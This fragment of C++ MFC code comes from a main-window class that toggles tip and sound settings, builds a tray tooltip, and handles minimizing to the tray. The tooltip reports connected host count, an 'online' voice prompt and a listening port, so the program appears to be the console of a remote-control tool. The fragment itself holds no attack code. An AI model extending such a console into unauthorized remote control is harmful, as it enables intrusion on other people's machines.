		CPoint Point;
		GetCursorPos(&Point);
		CXTPCommandBars::TrackPopupMenu(pPopup,TPM_RIGHTBUTTON,Point.x,Point.y,AfxGetMainWnd());
		
	}
	return NULL;
}
void CMainFrame::OnNewstips() 
{
	// TODO: Add your command handler code here
	BOOL Popt = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", Popt);
}

void CMainFrame::OnVoiceprompt() 
{
	// TODO: Add your command handler code here
	BOOL Popt = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Sound", Popt);
}

CString CMainFrame::Onlinetips()
{
	CString stro;
	BOOL a_chkm = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
	if(!a_chkm)
		stro = "开启";
	else
		stro = "关闭";
	
	return stro;
}

CString CMainFrame::OnVoicepromptsm()
{
	CString stro;
	BOOL a_chkm = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
	if(a_chkm)
		stro = "开启";
	else
		stro = "关闭";
	
	return stro;
}

void CMainFrame::NotifyIconTip()   //托盘信息显示
{
	CString Lineips = Onlinetips();
	CString Lineips1 = OnVoicepromptsm();
	wsprintf(m_NotifyIcon.szTip,"%s\n主机数量: %d台\n消息提示: %s\n上线语音: %s\n监听端口: %d ",strName,Host,Lineips1,Lineips,COM_Port);
}

void CMainFrame::OnShowStr()
{
	if(!MinTray)
	{
		MinTray=TRUE;  //最小托盘状态
		m_TrayIcon.MinimizeToTray(this);
	}
	else
	{
		MinTray=NULL;  //桌面显示状态
		AfxGetMainWnd()->SetForegroundWindow(); 
		m_TrayIcon.RemoveIcon();
		m_TrayIcon.MaximizeFromTray(this);
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	
}


void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here
	OnShowStr();
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}
